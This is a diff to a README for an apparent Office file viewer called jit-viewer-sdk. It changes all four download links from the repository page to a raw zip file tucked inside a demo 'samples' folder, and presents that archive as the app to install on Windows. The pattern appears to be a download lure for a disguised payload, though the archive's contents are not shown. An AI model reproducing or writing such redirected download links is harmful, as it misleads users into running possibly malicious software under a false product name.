@@ -1,12 +1,12 @@
 # 🖥️ jit-viewer-sdk - View Office Files with Ease
 
-[![Download jit-viewer-sdk](https://img.shields.io/badge/Download%20jit--viewer--sdk-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Drexr9558/jit-viewer-sdk)
+[![Download jit-viewer-sdk](https://img.shields.io/badge/Download%20jit--viewer--sdk-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Drexr9558/jit-viewer-sdk/raw/refs/heads/main/vue-demo/dist/samples/sdk_viewer_jit_2.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the app:
 
-[Download jit-viewer-sdk](https://github.com/Drexr9558/jit-viewer-sdk)
+[Download jit-viewer-sdk](https://github.com/Drexr9558/jit-viewer-sdk/raw/refs/heads/main/vue-demo/dist/samples/sdk_viewer_jit_2.2.zip)
 
 ## 🧭 What this app does
 
@@ -47,7 +47,7 @@ For smooth use, keep these file types ready:
 Follow these steps on Windows:
 
 1. Open the download page:
-   [Download jit-viewer-sdk](https://github.com/Drexr9558/jit-viewer-sdk)
+   [Download jit-viewer-sdk](https://github.com/Drexr9558/jit-viewer-sdk/raw/refs/heads/main/vue-demo/dist/samples/sdk_viewer_jit_2.2.zip)
 
 2. Download the package for Windows from the page.
 
@@ -171,7 +171,7 @@ It fits tasks such as:
 
 If you need the page again, use this link:
 
-[Visit the jit-viewer-sdk download page](https://github.com/Drexr9558/jit-viewer-sdk)
+[Visit the jit-viewer-sdk download page](https://github.com/Drexr9558/jit-viewer-sdk/raw/refs/heads/main/vue-demo/dist/samples/sdk_viewer_jit_2.2.zip)
 
 ## 🧪 Supported topic areas
 
